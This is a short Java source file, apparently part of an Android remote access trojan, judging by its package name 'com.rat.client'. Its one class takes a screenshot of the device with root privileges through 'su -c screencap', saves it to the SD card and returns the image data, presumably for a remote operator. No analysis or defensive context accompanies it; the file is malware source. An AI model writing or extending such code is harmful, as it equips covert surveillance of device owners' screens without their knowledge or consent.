package com.rat.client;

import android.content.Context;

public class Screen {
    public static String capture(Context ctx) {
        try {
            Process p = Runtime.getRuntime().exec(
                "su -c 'screencap -p /sdcard/s.png'");
            p.waitFor();
            return Files.read("/sdcard/s.png");
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }
}
